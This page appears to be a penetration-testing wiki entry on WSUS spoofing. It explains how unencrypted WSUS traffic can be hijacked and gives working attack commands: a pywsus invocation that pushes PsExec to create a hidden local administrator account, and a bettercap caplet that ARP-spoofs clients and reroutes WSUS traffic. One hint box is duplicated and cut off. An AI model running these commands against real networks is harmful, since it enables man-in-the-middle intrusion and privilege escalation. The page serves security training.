# ⭕ WSUS Spoofing

## <mark style="color:red;">WSUS</mark>

WSUS (Windows Server Update Services) allow administrators to centralize the management and deployment of Windows updates within their organization network. When first configuring this set of services, the default configuration makes the WSUS use HTTP without any secure layer like SSL/TLS. HTTPS is not enforced by default.

For example, a computer configured to get its updates from a WSUS server will initially perform the following handshake:

![](../../.gitbook/assets/image.png)

All metadata exchanges between the client and the server is done using the Simple Object Access Protocol (SOAP). By exploiting the lack of integrity of the SOAP calls transmitted over an unencrypted HTTP channel, an attacker performing a MITM attack can tamper responses to the SOAP requests “[SyncUpdates (software)](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-wusp/d955e0d0-c51f-4407-a701-995828fd1031)” and “[GetExtendedUpdateInfo](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-wusp/c199b64c-0684-49af-8278-c117e90c1e7a)”.



When pulling an update from the WSUS server, clients are redirected to the executable file to download and execute (which can only be a binary signed by Microsoft) and obtain a handler named `CommandLineInstallation` that specifies the additional parameters to pass the binary during the update installation. Without HTTPS, the WSUS is vulnerable to Man-in-the-Middle attacks where adversaries can either pose as the update server and send malicious updates or intercept and modify updates sent to the clients.

## <mark style="color:red;">pywsus</mark>

{% embed url="https://github.com/GoSecure/pywsus" %}

The evil WSUS server needs to be started before doing any ARP poisoning. The pywsus (Python) utility can be used for that matter.

```
python3 pywsus.py --host $network_facing_ip --port 8530 --executable /path/to/PsExec64.exe --command '/accepteula /s cmd.exe /c "net user testuser somepassword /add && net localgroup Administrators testuser /add"'
```

Programs other than PsExec.exe can be used here. Using built-in programs features to bypass security restrictions or operate attacks like this is called Living off the land (LOL). Other Windows LOL binaries and scripts (a.k.a. LOLbins or LOLbas) can be found on [lolbas-project.github.io](https://lolbas-project.github.io).

### <mark style="color:orange;">Poisoning and hijacking</mark>

Once the WSUS server is up and running, the ARP poisoning attack can start. The best tool to operate ARP poisoning is [bettercap](https://www.bettercap.org/) (Go) and for the majority of the scenarios, basic knowledge of the iptables utility is required.

Packets from the client to the WSUS server need to be hijacked and sent to the attacker's evil WSUS server. In order to do so, the attacker must pose as the client's gateway, route all traffic to the real gateway except the packets destined to the WSUS server.

```c
# quick recon of the network
net.probe on

# set the ARP spoofing
set arp.spoof.targets $client_ip
set arp.spoof.internal false
set arp.spoof.fullduplex false

# reroute traffic aimed at the WSUS server
set any.proxy.iface $interface
set any.proxy.protocol TCP
set any.proxy.src_address $WSUS_server_ip
set any.proxy.src_port 8530
set any.proxy.dst_address $attacker_ip
set any.proxy.dst_port 8530

# control logging and verbosity
events.ignore endpoint
events.ignore net.sniff

# start the modules
any.proxy on
arp.spoof on
net.sniff on
```

The caplet above can be loaded with the following command in order to launch the ARP poisoning attack.

```bash
bettercap --iface $interface --caplet wsus_spoofing.cap
```

### Triggering Windows update

The search for Windows updates can be manually triggered when having access to the target computer by going to `Settings > Update & Security > Windows Update > Check for updates`.&#x20;

{% hint style="info" %}
By default, the automatic updates interval is 22 hours ([source](https://docs.microsoft.com/en-us/windows/deployment/update/waas-wu-settings)).
{% endhint %}



{% hint style="info" %}
urs ([source](https://docs.microsoft.com/en-us/windows/deployment/update/waas-wu-settings)).
{% endhint %}

## <mark style="color:red;">Alternative attack</mark>

Another way of attacking insecure WSUS without having to rely on ARP poisoning but requiring user access to the target machine is explained in the following blogpost : [WSUS Attacks Part 2: CVE-2020-1013 a Windows 10 Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)

## <mark style="color:red;">WSUSpect Proxy</mark>

{% embed url="https://github.com/pimps/wsuxploit" %}
